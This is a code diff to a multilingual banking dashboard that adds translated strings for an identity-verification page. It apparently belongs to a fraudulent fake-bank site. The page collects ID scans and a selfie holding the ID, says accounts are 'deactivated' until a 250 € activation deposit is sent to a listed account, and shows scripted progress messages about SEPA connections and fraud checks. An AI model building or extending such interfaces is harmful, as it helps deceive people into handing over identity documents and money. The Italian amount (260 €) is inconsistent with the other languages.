@@ -182,6 +182,42 @@ const DASHBOARD_UI = {
     accountDeactivatedTitle: "Konto deaktiviert",
     accountDeactivatedDesc: "Ihr Konto wurde vorübergehend deaktiviert, da seit der Kontoeröffnung keine Einzahlungen oder Abhebungen stattgefunden haben. Bitte aktivieren Sie Ihr Konto, indem Sie Ihren Kundenbetreuer kontaktieren.",
     contactSupport: "Support kontaktieren",
+      kycPageTitle: "KYC / Identitätsverifizierung",
+    docFrontDesc: "Vorderseite Personalausweis oder Reisepass",
+    docBackDesc: "Rückseite Personalausweis (nicht nötig bei Reisepass)",
+    docSelfieDesc: "Foto von Ihnen, auf dem Sie Ihren Ausweis halten",
+    kycUploadErrorGeneric: "Fehler",
+    kycStatusUnverified: "Nicht verifiziert",
+    kycStatusPending: "Wird überprüft",
+    kycStatusApproved: "Verifiziert ✓",
+    kycStatusRejected: "Abgelehnt",
+    kycDescUnverified: "Laden Sie Ihre Identitätsdokumente hoch, um Ihr Konto freizuschalten.",
+    kycDescPending: "Ihre Dokumente werden geprüft. Dies dauert in der Regel 1–3 Werktage.",
+    kycDescApprovedActive: "Ihr Konto ist vollständig verifiziert und aktiv.",
+    kycDescApprovedInactive: "KYC abgeschlossen. Aktivierungseinzahlung erforderlich (siehe unten).",
+    kycDescRejected: "Ihre Dokumente wurden abgelehnt. Bitte laden Sie neue Dokumente hoch.",
+    activationTitle: "Kontoaktivierung — Mindesteinzahlung erforderlich",
+    activationDescPre: "Um Ihr Konto zu aktivieren, überweisen Sie bitte einen ",
+    activationDescBold: "Mindestbetrag von 250 €",
+    activationDescPost: " auf folgendes Konto:",
+    requiredDocsTitle: "Erforderliche Dokumente",
+    acceptedFormatsKyc: "Akzeptierte Formate: JPG, PNG, PDF — max. 10 MB pro Datei",
+    inProgressShort: "⏳ In Bearbeitung",
+    submittedShort: "✓ Eingereicht",
+    loadingShort: "Lädt…",
+    uploadedShort: "Hochgeladen",
+    replaceShort: "Ersetzen",
+    uploadShort: "Hochladen",
+    fullyVerifiedTitle: "Konto vollständig verifiziert",
+    fullyVerifiedDesc: "Alle KYC-Anforderungen erfüllt. Voller Zugang zu allen Diensten.",
+    progressStep1: "Sicherheitsprüfung läuft…",
+    progressStep2: "Kontodaten werden verifiziert…",
+    progressStep3: "Verbindung zum SEPA-Netzwerk wird aufgebaut…",
+    progressStep4: "Compliance-Prüfung wird durchgeführt…",
+    progressStep5: "Betrugsschutz-Analyse läuft…",
+    progressStep6: "Risikobewertung des Auftrags läuft…",
+    progressStep7: "Abschließende Überprüfung der Konditionen…",
+      progressShortLabels: ["Sicherheit", "Konto", "SEPA", "Compliance", "Schutz", "Risiko", "Freigabe"],
   },
   fr: {
     nav: ["Tableau de bord", "Comptes", "Virements", "Crédit", "Cartes", "Épargne", "Don / Zakat", "Documents", "KYC / Identité", "Profil"],
@@ -344,6 +380,42 @@ const DASHBOARD_UI = {
     accountDeactivatedTitle: "Compte désactivé",
     accountDeactivatedDesc: "Votre compte a été temporairement désactivé, aucun dépôt ni retrait n'ayant eu lieu depuis son ouverture. Veuillez l'activer en contactant votre conseiller.",
     contactSupport: "Contacter le support",
+      kycPageTitle: "KYC / Vérification d'identité",
+    docFrontDesc: "Recto de la carte d'identité ou passeport",
+    docBackDesc: "Verso de la carte d'identité (pas nécessaire pour un passeport)",
+    docSelfieDesc: "Photo de vous tenant votre pièce d'identité",
+    kycUploadErrorGeneric: "Erreur",
+    kycStatusUnverified: "Non vérifié",
+    kycStatusPending: "En cours de vérification",
+    kycStatusApproved: "Vérifié ✓",
+    kycStatusRejected: "Refusé",
+    kycDescUnverified: "Téléchargez vos documents d'identité pour débloquer votre compte.",
+    kycDescPending: "Vos documents sont en cours de vérification. Cela prend généralement 1 à 3 jours ouvrés.",
+    kycDescApprovedActive: "Votre compte est entièrement vérifié et actif.",
+    kycDescApprovedInactive: "KYC terminé. Un versement d'activation est requis (voir ci-dessous).",
+    kycDescRejected: "Vos documents ont été refusés. Veuillez en soumettre de nouveaux.",
+    activationTitle: "Activation du compte — Dépôt minimum requis",
+    activationDescPre: "Pour activer votre compte, veuillez virer un ",
+    activationDescBold: "montant minimum de 250 €",
+    activationDescPost: " sur le compte suivant :",
+    requiredDocsTitle: "Documents requis",
+    acceptedFormatsKyc: "Formats acceptés : JPG, PNG, PDF — max. 10 Mo par fichier",
+    inProgressShort: "⏳ En cours de traitement",
+    submittedShort: "✓ Soumis",
+    loadingShort: "Chargement…",
+    uploadedShort: "Envoyé",
+    replaceShort: "Remplacer",
+    uploadShort: "Envoyer",
+    fullyVerifiedTitle: "Compte entièrement vérifié",
+    fullyVerifiedDesc: "Toutes les exigences KYC sont remplies. Accès complet à tous les services.",
+    progressStep1: "Vérification de sécurité en cours…",
+    progressStep2: "Vérification des données du compte…",
+    progressStep3: "Connexion au réseau SEPA…",
+    progressStep4: "Contrôle de conformité en cours…",
+    progressStep5: "Analyse anti-fraude en cours…",
+    progressStep6: "Évaluation du risque de l'opération…",
+    progressStep7: "Vérification finale des conditions…",
+      progressShortLabels: ["Sécurité", "Compte", "SEPA", "Conformité", "Protection", "Risque", "Validation"],
   },
   en: {
     nav: ["Overview", "Accounts", "Transfers", "Credit", "Cards", "Savings", "Donation / Zakat", "Documents", "KYC / Identity", "Profile"],
@@ -506,6 +578,42 @@ const DASHBOARD_UI = {
     accountDeactivatedTitle: "Account deactivated",
     accountDeactivatedDesc: "Your account has been temporarily deactivated because no deposits or withdrawals have been made since it was opened. Please activate it by contacting your account manager.",
     contactSupport: "Contact support",
+      kycPageTitle: "KYC / Identity verification",
+    docFrontDesc: "Front of ID card or passport",
+    docBackDesc: "Back of ID card (not needed for a passport)",
+    docSelfieDesc: "Photo of yourself holding your ID",
+    kycUploadErrorGeneric: "Error",
+    kycStatusUnverified: "Not verified",
+    kycStatusPending: "Under review",
+    kycStatusApproved: "Verified ✓",
+    kycStatusRejected: "Rejected",
+    kycDescUnverified: "Upload your identity documents to unlock your account.",
+    kycDescPending: "Your documents are being reviewed. This usually takes 1–3 business days.",
+    kycDescApprovedActive: "Your account is fully verified and active.",
+    kycDescApprovedInactive: "KYC complete. An activation deposit is required (see below).",
+    kycDescRejected: "Your documents were rejected. Please upload new ones.",
+    activationTitle: "Account activation — Minimum deposit required",
+    activationDescPre: "To activate your account, please transfer a ",
+    activationDescBold: "minimum amount of €250",
+    activationDescPost: " to the following account:",
+    requiredDocsTitle: "Required documents",
+    acceptedFormatsKyc: "Accepted formats: JPG, PNG, PDF — max. 10 MB per file",
+    inProgressShort: "⏳ In progress",
+    submittedShort: "✓ Submitted",
+    loadingShort: "Uploading…",
+    uploadedShort: "Uploaded",
+    replaceShort: "Replace",
+    uploadShort: "Upload",
+    fullyVerifiedTitle: "Account fully verified",
+    fullyVerifiedDesc: "All KYC requirements met. Full access to all services.",
+    progressStep1: "Security check in progress…",
+    progressStep2: "Verifying account details…",
+    progressStep3: "Connecting to the SEPA network…",
+    progressStep4: "Running compliance check…",
+    progressStep5: "Running fraud protection analysis…",
+    progressStep6: "Assessing transfer risk…",
+    progressStep7: "Final review of conditions…",
+      progressShortLabels: ["Security", "Account", "SEPA", "Compliance", "Protection", "Risk", "Approval"],
   },
   ar: {
     nav: ["نظرة عامة", "الحسابات", "التحويلات", "الائتمان", "البطاقات", "المدخرات", "تبرع / زكاة", "المستندات", "KYC / الهوية", "الملف الشخصي"],
@@ -668,6 +776,42 @@ const DASHBOARD_UI = {
     accountDeactivatedTitle: "الحساب معطَّل",
     accountDeactivatedDesc: "تم تعطيل حسابكم مؤقتًا لعدم وجود أي إيداع أو سحب منذ فتحه. يرجى تفعيله بالاتصال بمدير حسابكم.",
     contactSupport: "الاتصال بالدعم",
+      kycPageTitle: "التحقق من الهوية (KYC)",
+    docFrontDesc: "الوجه الأمامي لبطاقة الهوية أو جواز السفر",
+    docBackDesc: "الوجه الخلفي لبطاقة الهوية (غير مطلوب لجواز السفر)",
+    docSelfieDesc: "صورة لكم وأنتم تحملون بطاقة هويتكم",
+    kycUploadErrorGeneric: "خطأ",
+    kycStatusUnverified: "غير موثّق",
+    kycStatusPending: "قيد المراجعة",
+    kycStatusApproved: "موثّق ✓",
+    kycStatusRejected: "مرفوض",
+    kycDescUnverified: "قم برفع مستندات هويتك لفتح حسابك.",
+    kycDescPending: "جارٍ مراجعة مستنداتكم. يستغرق ذلك عادةً من 1 إلى 3 أيام عمل.",
+    kycDescApprovedActive: "حسابكم موثّق بالكامل ونشط.",
+    kycDescApprovedInactive: "اكتمل التحقق من الهوية. يلزم إيداع تفعيل (انظر أدناه).",
+    kycDescRejected: "تم رفض مستنداتكم. يرجى رفع مستندات جديدة.",
+    activationTitle: "تفعيل الحساب — إيداع أدنى مطلوب",
+    activationDescPre: "لتفعيل حسابكم، يرجى تحويل ",
+    activationDescBold: "مبلغ أدنى قدره 250 €",
+    activationDescPost: " إلى الحساب التالي:",
+    requiredDocsTitle: "المستندات المطلوبة",
+    acceptedFormatsKyc: "الصيغ المقبولة: JPG, PNG, PDF — الحد الأقصى 10 ميغابايت لكل ملف",
+    inProgressShort: "⏳ قيد المعالجة",
+    submittedShort: "✓ تم الإرسال",
+    loadingShort: "جارٍ الرفع…",
+    uploadedShort: "تم الرفع",
+    replaceShort: "استبدال",
+    uploadShort: "رفع",
+    fullyVerifiedTitle: "الحساب موثّق بالكامل",
+    fullyVerifiedDesc: "تم استيفاء جميع متطلبات التحقق من الهوية. وصول كامل لجميع الخدمات.",
+    progressStep1: "جارٍ التحقق الأمني…",
+    progressStep2: "جارٍ التحقق من بيانات الحساب…",
+    progressStep3: "جارٍ الاتصال بشبكة SEPA…",
+    progressStep4: "جارٍ تنفيذ فحص الامتثال…",
+    progressStep5: "جارٍ تحليل الحماية من الاحتيال…",
+    progressStep6: "جارٍ تقييم مخاطر العملية…",
+    progressStep7: "المراجعة النهائية للشروط…",
+      progressShortLabels: ["الأمان", "الحساب", "SEPA", "الامتثال", "الحماية", "المخاطر", "الموافقة"],
   },
   tr: {
     nav: ["Genel Bakış", "Hesaplar", "Transferler", "Kredi", "Kartlar", "Tasarruf", "Bağış / Zekat", "Belgeler", "KYC / Kimlik", "Profil"],
@@ -830,6 +974,42 @@ const DASHBOARD_UI = {
     accountDeactivatedTitle: "Hesap devre dışı",
     accountDeactivatedDesc: "Hesabınız açıldığından beri herhangi bir para yatırma veya çekme işlemi yapılmadığı için geçici olarak devre dışı bırakıldı. Lütfen hesap yöneticinizle iletişime geçerek etkinleştirin.",
     contactSupport: "Destek ile iletişime geç",
+      kycPageTitle: "KYC / Kimlik Doğrulama",
+    docFrontDesc: "Kimlik kartı ön yüzü veya pasaport",
+    docBackDesc: "Kimlik kartı arka yüzü (pasaport için gerekli değil)",
+    docSelfieDesc: "Kimliğinizi tutarken çekilmiş fotoğrafınız",
+    kycUploadErrorGeneric: "Hata",
+    kycStatusUnverified: "Doğrulanmadı",
+    kycStatusPending: "İnceleniyor",
+    kycStatusApproved: "Doğrulandı ✓",
+    kycStatusRejected: "Reddedildi",
+    kycDescUnverified: "Hesabınızın kilidini açmak için kimlik belgelerinizi yükleyin.",
+    kycDescPending: "Belgeleriniz inceleniyor. Bu genellikle 1–3 iş günü sürer.",
+    kycDescApprovedActive: "Hesabınız tamamen doğrulandı ve aktif.",
+    kycDescApprovedInactive: "KYC tamamlandı. Aktivasyon yatırımı gerekiyor (aşağıya bakın).",
+    kycDescRejected: "Belgeleriniz reddedildi. Lütfen yeni belgeler yükleyin.",
+    activationTitle: "Hesap aktivasyonu — Asgari yatırım gerekli",
+    activationDescPre: "Hesabınızı etkinleştirmek için lütfen ",
+    activationDescBold: "asgari 250 €",
+    activationDescPost: " tutarını aşağıdaki hesaba gönderin:",
+    requiredDocsTitle: "Gerekli belgeler",
+    acceptedFormatsKyc: "Kabul edilen formatlar: JPG, PNG, PDF — dosya başına maks. 10 MB",
+    inProgressShort: "⏳ İşlemde",
+    submittedShort: "✓ Gönderildi",
+    loadingShort: "Yükleniyor…",
+    uploadedShort: "Yüklendi",
+    replaceShort: "Değiştir",
+    uploadShort: "Yükle",
+    fullyVerifiedTitle: "Hesap tamamen doğrulandı",
+    fullyVerifiedDesc: "Tüm KYC gereksinimleri karşılandı. Tüm hizmetlere tam erişim.",
+    progressStep1: "Güvenlik kontrolü yapılıyor…",
+    progressStep2: "Hesap bilgileri doğrulanıyor…",
+    progressStep3: "SEPA ağına bağlanılıyor…",
+    progressStep4: "Uyumluluk kontrolü yapılıyor…",
+    progressStep5: "Dolandırıcılık koruma analizi yapılıyor…",
+    progressStep6: "İşlem risk değerlendirmesi yapılıyor…",
+    progressStep7: "Koşulların son incelemesi…",
+      progressShortLabels: ["Güvenlik", "Hesap", "SEPA", "Uyumluluk", "Koruma", "Risk", "Onay"],
   },
   es: {
     nav: ["Resumen", "Cuentas", "Transferencias", "Crédito", "Tarjetas", "Ahorros", "Donación / Zakat", "Documentos", "KYC / Identidad", "Perfil"],
@@ -923,6 +1103,42 @@ const DASHBOARD_UI = {
     accountDeactivatedTitle: "Cuenta desactivada",
     accountDeactivatedDesc: "Su cuenta ha sido desactivada temporalmente porque no se han realizado depósitos ni retiros desde su apertura. Actívela contactando a su gestor de cuenta.",
     contactSupport: "Contactar con soporte",
+      kycPageTitle: "KYC / Verificación de identidad",
+    docFrontDesc: "Anverso del DNI o pasaporte",
+    docBackDesc: "Reverso del DNI (no necesario para pasaporte)",
+    docSelfieDesc: "Foto suya sosteniendo su documento de identidad",
+    kycUploadErrorGeneric: "Error",
+    kycStatusUnverified: "No verificado",
+    kycStatusPending: "En revisión",
+    kycStatusApproved: "Verificado ✓",
+    kycStatusRejected: "Rechazado",
+    kycDescUnverified: "Suba sus documentos de identidad para desbloquear su cuenta.",
+    kycDescPending: "Sus documentos están siendo revisados. Esto suele tardar de 1 a 3 días hábiles.",
+    kycDescApprovedActive: "Su cuenta está totalmente verificada y activa.",
+    kycDescApprovedInactive: "KYC completado. Se requiere un depósito de activación (ver abajo).",
+    kycDescRejected: "Sus documentos fueron rechazados. Suba nuevos documentos.",
+    activationTitle: "Activación de cuenta — Depósito mínimo requerido",
+    activationDescPre: "Para activar su cuenta, transfiera un ",
+    activationDescBold: "importe mínimo de 250 €",
+    activationDescPost: " a la siguiente cuenta:",
+    requiredDocsTitle: "Documentos requeridos",
+    acceptedFormatsKyc: "Formatos aceptados: JPG, PNG, PDF — máx. 10 MB por archivo",
+    inProgressShort: "⏳ En trámite",
+    submittedShort: "✓ Enviado",
+    loadingShort: "Subiendo…",
+    uploadedShort: "Subido",
+    replaceShort: "Reemplazar",
+    uploadShort: "Subir",
+    fullyVerifiedTitle: "Cuenta totalmente verificada",
+    fullyVerifiedDesc: "Se cumplen todos los requisitos KYC. Acceso completo a todos los servicios.",
+    progressStep1: "Verificación de seguridad en curso…",
+    progressStep2: "Verificando datos de la cuenta…",
+    progressStep3: "Conectando a la red SEPA…",
+    progressStep4: "Realizando control de cumplimiento…",
+    progressStep5: "Realizando análisis antifraude…",
+    progressStep6: "Evaluando el riesgo de la operación…",
+    progressStep7: "Revisión final de las condiciones…",
+      progressShortLabels: ["Seguridad", "Cuenta", "SEPA", "Cumplimiento", "Protección", "Riesgo", "Aprobación"],
   },
   it: {
     nav: ["Panoramica", "Conti", "Bonifici", "Credito", "Carte", "Risparmio", "Donazione / Zakat", "Documenti", "KYC / Identità", "Profilo"],
@@ -1016,6 +1232,42 @@ const DASHBOARD_UI = {
     accountDeactivatedTitle: "Conto disattivato",
     accountDeactivatedDesc: "Il tuo conto è stato temporaneamente disattivato poiché non sono stati effettuati depositi o prelievi dalla sua apertura. Attivalo contattando il tuo gestore di conto.",
     contactSupport: "Contatta il supporto",
+      kycPageTitle: "KYC / Verifica dell'identità",
+    docFrontDesc: "Fronte della carta d'identità o passaporto",
+    docBackDesc: "Retro della carta d'identità (non necessario per il passaporto)",
+    docSelfieDesc: "Foto di voi con in mano il documento d'identità",
+    kycUploadErrorGeneric: "Errore",
+    kycStatusUnverified: "Non verificato",
+    kycStatusPending: "In revisione",
+    kycStatusApproved: "Verificato ✓",
+    kycStatusRejected: "Rifiutato",
+    kycDescUnverified: "Carica i tuoi documenti d'identità per sbloccare il tuo conto.",
+    kycDescPending: "I tuoi documenti sono in fase di revisione. Di solito richiede 1–3 giorni lavorativi.",
+    kycDescApprovedActive: "Il tuo conto è completamente verificato e attivo.",
+    kycDescApprovedInactive: "KYC completato. È richiesto un deposito di attivazione (vedi sotto).",
+    kycDescRejected: "I tuoi documenti sono stati rifiutati. Carica nuovi documenti.",
+    activationTitle: "Attivazione conto — Deposito minimo richiesto",
+    activationDescPre: "Per attivare il tuo conto, trasferisci un ",
+    activationDescBold: "importo minimo di 260 €",
+    activationDescPost: " sul seguente conto:",
+    requiredDocsTitle: "Documenti richiesti",
+    acceptedFormatsKyc: "Formati accettati: JPG, PNG, PDF — max. 10 MB per file",
+    inProgressShort: "⏳ In corso",
+    submittedShort: "✓ Inviato",
+    loadingShort: "Caricamento…",
+    uploadedShort: "Caricato",
+    replaceShort: "Sostituisci",
+    uploadShort: "Carica",
+    fullyVerifiedTitle: "Conto completamente verificato",
+    fullyVerifiedDesc: "Tutti i requisiti KYC soddisfatti. Accesso completo a tutti i servizi.",
+    progressStep1: "Controllo di sicurezza in corso…",
+    progressStep2: "Verifica dei dati del conto in corso…",
+    progressStep3: "Connessione alla rete SEPA in corso…",
+    progressStep4: "Controllo di conformità in corso…",
+    progressStep5: "Analisi antifrode in corso…",
+    progressStep6: "Valutazione del rischio dell'operazione…",
+    progressStep7: "Revisione finale delle condizioni…",
+      progressShortLabels: ["Sicurezza", "Conto", "SEPA", "Conformità", "Protezione", "Rischio", "Approvazione"],
   },
   pt: {
     nav: ["Visão geral", "Contas", "Transferências", "Crédito", "Cartões", "Poupança", "Doação / Zakat", "Documentos", "KYC / Identidade", "Perfil"],
@@ -1109,6 +1361,42 @@ const DASHBOARD_UI = {
     accountDeactivatedTitle: "Conta desativada",
     accountDeactivatedDesc: "A sua conta foi temporariamente desativada por não terem sido efetuados depósitos ou levantamentos desde a sua abertura. Ative-a contactando o seu gestor de conta.",
     contactSupport: "Contactar o suporte",
+      kycPageTitle: "KYC / Verificação de identidade",
+    docFrontDesc: "Frente do cartão de cidadão ou passaporte",
+    docBackDesc: "Verso do cartão de cidadão (não necessário para passaporte)",
+    docSelfieDesc: "Foto sua segurando o seu documento de identidade",
+    kycUploadErrorGeneric: "Erro",
+    kycStatusUnverified: "Não verificado",
+    kycStatusPending: "Em análise",
+    kycStatusApproved: "Verificado ✓",
+    kycStatusRejected: "Rejeitado",
+    kycDescUnverified: "Carregue os seus documentos de identidade para desbloquear a sua conta.",
+    kycDescPending: "Os seus documentos estão a ser analisados. Isto demora normalmente 1 a 3 dias úteis.",
+    kycDescApprovedActive: "A sua conta está totalmente verificada e ativa.",
+    kycDescApprovedInactive: "KYC concluído. É necessário um depósito de ativação (ver abaixo).",
+    kycDescRejected: "Os seus documentos foram rejeitados. Carregue novos documentos.",
+    activationTitle: "Ativação da conta — Depósito mínimo necessário",
+    activationDescPre: "Para ativar a sua conta, transfira um ",
+    activationDescBold: "valor mínimo de 250 €",
+    activationDescPost: " para a seguinte conta:",
+    requiredDocsTitle: "Documentos necessários",
+    acceptedFormatsKyc: "Formatos aceites: JPG, PNG, PDF — máx. 10 MB por ficheiro",
+    inProgressShort: "⏳ Em processamento",
+    submittedShort: "✓ Submetido",
+    loadingShort: "A carregar…",
+    uploadedShort: "Carregado",
+    replaceShort: "Substituir",
+    uploadShort: "Carregar",
+    fullyVerifiedTitle: "Conta totalmente verificada",
+    fullyVerifiedDesc: "Todos os requisitos de KYC cumpridos. Acesso total a todos os serviços.",
+    progressStep1: "Verificação de segurança em curso…",
+    progressStep2: "A verificar os dados da conta…",
+    progressStep3: "A ligar à rede SEPA…",
+    progressStep4: "A realizar verificação de conformidade…",
+    progressStep5: "A realizar análise antifraude…",
+    progressStep6: "A avaliar o risco da operação…",
+    progressStep7: "Revisão final das condições…",
+      progressShortLabels: ["Segurança", "Conta", "SEPA", "Conformidade", "Proteção", "Risco", "Aprovação"],
   },
   nl: {
     nav: ["Overzicht", "Rekeningen", "Overschrijvingen", "Krediet", "Kaarten", "Sparen", "Donatie / Zakat", "Documenten", "KYC / Identiteit", "Profiel"],
@@ -1202,6 +1490,42 @@ const DASHBOARD_UI = {
     accountDeactivatedTitle: "Rekening gedeactiveerd",
     accountDeactivatedDesc: "Uw rekening is tijdelijk gedeactiveerd omdat er sinds de opening geen stortingen of opnames hebben plaatsgevonden. Activeer deze door contact op te nemen met uw accountbeheerder.",
     contactSupport: "Contact opnemen met support",
+      kycPageTitle: "KYC / Identiteitsverificatie",
+    docFrontDesc: "Voorzijde identiteitskaart of paspoort",
+    docBackDesc: "Achterzijde identiteitskaart (niet nodig bij paspoort)",
+    docSelfieDesc: "Foto van uzelf met uw identiteitsbewijs",
+    kycUploadErrorGeneric: "Fout",
+    kycStatusUnverified: "Niet geverifieerd",
+    kycStatusPending: "In behandeling",
+    kycStatusApproved: "Geverifieerd ✓",
+    kycStatusRejected: "Afgewezen",
+    kycDescUnverified: "Upload uw identiteitsdocumenten om uw rekening te deblokkeren.",
+    kycDescPending: "Uw documenten worden gecontroleerd. Dit duurt doorgaans 1–3 werkdagen.",
+    kycDescApprovedActive: "Uw rekening is volledig geverifieerd en actief.",
+    kycDescApprovedInactive: "KYC voltooid. Een activeringsstorting is vereist (zie hieronder).",
+    kycDescRejected: "Uw documenten zijn afgewezen. Upload nieuwe documenten.",
+    activationTitle: "Rekeningactivering — Minimale storting vereist",
+    activationDescPre: "Om uw rekening te activeren, maak een ",
+    activationDescBold: "minimumbedrag van € 250",
+    activationDescPost: " over naar de volgende rekening:",
+    requiredDocsTitle: "Vereiste documenten",
+    acceptedFormatsKyc: "Geaccepteerde formaten: JPG, PNG, PDF — max. 10 MB per bestand",
+    inProgressShort: "⏳ In behandeling",
+    submittedShort: "✓ Ingediend",
+    loadingShort: "Bezig met laden…",
+    uploadedShort: "Geüpload",
+    replaceShort: "Vervangen",
+    uploadShort: "Uploaden",
+    fullyVerifiedTitle: "Rekening volledig geverifieerd",
+    fullyVerifiedDesc: "Aan alle KYC-vereisten voldaan. Volledige toegang tot alle diensten.",
+    progressStep1: "Beveiligingscontrole bezig…",
+    progressStep2: "Rekeninggegevens worden geverifieerd…",
+    progressStep3: "Verbinding met SEPA-netwerk wordt tot stand gebracht…",
+    progressStep4: "Nalevingscontrole wordt uitgevoerd…",
+    progressStep5: "Fraudebeschermingsanalyse bezig…",
+    progressStep6: "Risicobeoordeling van de opdracht bezig…",
+    progressStep7: "Laatste controle van de voorwaarden…",
+      progressShortLabels: ["Beveiliging", "Rekening", "SEPA", "Naleving", "Bescherming", "Risico", "Goedkeuring"],
   },
 } as const;
 
@@ -1412,9 +1736,9 @@ function KycPage({ token, kycStatus, accountStatus, activationRequired, dui }: {
   token: string; kycStatus: string; accountStatus: string; activationRequired: boolean; dui?: DUI;
 }) {
   const DOC_TYPES = [
-    { id: "id_front", label: dui?.docFront ?? "Vorderseite Ausweis", desc: "Vorderseite Personalausweis oder Reisepass" },
-    { id: "id_back",  label: dui?.docBack ?? "Rückseite Ausweis",   desc: "Rückseite Personalausweis (nicht nötig bei Reisepass)" },
-    { id: "selfie",   label: dui?.docSelfie ?? "Selfie mit Ausweis", desc: "Foto von Ihnen, auf dem Sie Ihren Ausweis halten" },
+    { id: "id_front", label: dui?.docFront ?? "Vorderseite Ausweis", desc: dui?.docFrontDesc ?? "Vorderseite Personalausweis oder Reisepass" },
+    { id: "id_back",  label: dui?.docBack ?? "Rückseite Ausweis",   desc: dui?.docBackDesc ?? "Rückseite Personalausweis (nicht nötig bei Reisepass)" },
+    { id: "selfie",   label: dui?.docSelfie ?? "Selfie mit Ausweis", desc: dui?.docSelfieDesc ?? "Foto von Ihnen, auf dem Sie Ihren Ausweis halten" },
   ] as const;
   const [docs, setDocs] = React.useState<KycDocument[]>([]);
   const [loading, setLoading] = React.useState(true);
@@ -1440,7 +1764,7 @@ function KycPage({ token, kycStatus, accountStatus, activationRequired, dui }: {
       body: fd,
     });
     const data = await res.json();
-    if (!res.ok) { setUploadErr(data.error || "Fehler"); }
+    if (!res.ok) { setUploadErr(data.error || (dui?.kycUploadErrorGeneric ?? "Fehler")); }
     else { setUploadOk(docType); fetchDocs(); }
     setUploading(null);
   }
@@ -1454,7 +1778,7 @@ function KycPage({ token, kycStatus, accountStatus, activationRequired, dui }: {
     unverified: "#991B1B", pending: "#92400E", approved: "#166534", rejected: "#991B1B",
   };
   const statusLabel: Record<string, string> = {
-    unverified: "Nicht verifiziert", pending: "Wird überprüft", approved: "Verifiziert ✓", rejected: "Abgelehnt",
+    unverified: dui?.kycStatusUnverified ?? "Nicht verifiziert", pending: dui?.kycStatusPending ?? "Wird überprüft", approved: dui?.kycStatusApproved ?? "Verifiziert ✓", rejected: dui?.kycStatusRejected ?? "Abgelehnt",
   };
   const statusIcon: Record<string, React.ReactNode> = {
     unverified: <AlertCircle size={20} color="#DC2626" />,
@@ -1467,7 +1791,7 @@ function KycPage({ token, kycStatus, accountStatus, activationRequired, dui }: {
 
   return (
     <div style={{ padding: 24, maxWidth: 640 }}>
-      <h2 style={{ color: "#0F172A", fontWeight: 800, fontSize: "1.2rem", margin: "0 0 20px" }}>KYC / Identitätsverifizierung</h2>
+      <h2 style={{ color: "#0F172A", fontWeight: 800, fontSize: "1.2rem", margin: "0 0 20px" }}>{dui?.kycPageTitle ?? "KYC / Identitätsverifizierung"}</h2>
 
       {/* Status banner */}
       <div style={{ background: statusBg[effectiveKyc] ?? "#F8FAFC", border: `1px solid ${statusColor[effectiveKyc] ?? "#94A3B8"}30`, borderRadius: 16, padding: "18px 22px", marginBottom: 20, display: "flex", alignItems: "center", gap: 14 }}>
@@ -1475,11 +1799,11 @@ function KycPage({ token, kycStatus, accountStatus, activationRequired, dui }: {
         <div>
           <p style={{ color: statusColor[effectiveKyc] ?? "#334155", fontWeight: 700, fontSize: "0.9rem", margin: 0 }}>{statusLabel[effectiveKyc] ?? effectiveKyc}</p>
           <p style={{ color: statusColor[effectiveKyc] ?? "#334155", fontSize: "0.78rem", margin: "3px 0 0", opacity: 0.8 }}>
-            {effectiveKyc === "unverified" && "Laden Sie Ihre Identitätsdokumente hoch, um Ihr Konto freizuschalten."}
-            {effectiveKyc === "pending" && "Ihre Dokumente werden geprüft. Dies dauert in der Regel 1–3 Werktage."}
-            {effectiveKyc === "approved" && accountStatus === "active" && "Ihr Konto ist vollständig verifiziert und aktiv."}
-            {effectiveKyc === "approved" && accountStatus !== "active" && "KYC abgeschlossen. Aktivierungseinzahlung erforderlich (siehe unten)."}
-            {effectiveKyc === "rejected" && "Ihre Dokumente wurden abgelehnt. Bitte laden Sie neue Dokumente hoch."}
+            {effectiveKyc === "unverified" && (dui?.kycDescUnverified ?? "Laden Sie Ihre Identitätsdokumente hoch, um Ihr Konto freizuschalten.")}
+            {effectiveKyc === "pending" && (dui?.kycDescPending ?? "Ihre Dokumente werden geprüft. Dies dauert in der Regel 1–3 Werktage.")}
+            {effectiveKyc === "approved" && accountStatus === "active" && (dui?.kycDescApprovedActive ?? "Ihr Konto ist vollständig verifiziert und aktiv.")}
+            {effectiveKyc === "approved" && accountStatus !== "active" && (dui?.kycDescApprovedInactive ?? "KYC abgeschlossen. Aktivierungseinzahlung erforderlich (siehe unten).")}
+            {effectiveKyc === "rejected" && (dui?.kycDescRejected ?? "Ihre Dokumente wurden abgelehnt. Bitte laden Sie neue Dokumente hoch.")}
           </p>
         </div>
       </div>
@@ -1489,10 +1813,10 @@ function KycPage({ token, kycStatus, accountStatus, activationRequired, dui }: {
         <div style={{ background: "#FFFBF0", border: "2px solid #FDE68A", borderRadius: 16, padding: "20px 22px", marginBottom: 20 }}>
           <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 14 }}>
             <Building2 size={18} color="#D97706" />
-            <p style={{ color: "#92400E", fontWeight: 700, fontSize: "0.9rem", margin: 0 }}>Kontoaktivierung — Mindesteinzahlung erforderlich</p>
+            <p style={{ color: "#92400E", fontWeight: 700, fontSize: "0.9rem", margin: 0 }}>{dui?.activationTitle ?? "Kontoaktivierung — Mindesteinzahlung erforderlich"}</p>
           </div>
           <p style={{ color: "#78350F", fontSize: "0.82rem", margin: "0 0 14px", lineHeight: 1.6 }}>
-            Um Ihr Konto zu aktivieren, überweisen Sie bitte einen <strong>Mindestbetrag von 250 €</strong> auf folgendes Konto:
+            {dui?.activationDescPre ?? "Um Ihr Konto zu aktivieren, überweisen Sie bitte einen "}<strong>{dui?.activationDescBold ?? "Mindestbetrag von 250 €"}</strong>{dui?.activationDescPost ?? " auf folgendes Konto:"}
           </p>
           {[
             [dui?.recipientLabel ?? "Empfänger", "KT Bank AG"],
@@ -1512,8 +1836,8 @@ function KycPage({ token, kycStatus, accountStatus, activationRequired, dui }: {
       {effectiveKyc !== "approved" && (
         <div style={{ background: "white", borderRadius: 18, border: "1px solid #E9EEF4", overflow: "hidden" }}>
           <div style={{ padding: "16px 22px", borderBottom: "1px solid #F1F5F9" }}>
-            <p style={{ color: "#0F172A", fontWeight: 700, fontSize: "0.88rem", margin: 0 }}>Erforderliche Dokumente</p>
-            <p style={{ color: "#64748B", fontSize: "0.75rem", margin: "3px 0 0" }}>Akzeptierte Formate: JPG, PNG, PDF — max. 10 MB pro Datei</p>
+            <p style={{ color: "#0F172A", fontWeight: 700, fontSize: "0.88rem", margin: 0 }}>{dui?.requiredDocsTitle ?? "Erforderliche Dokumente"}</p>
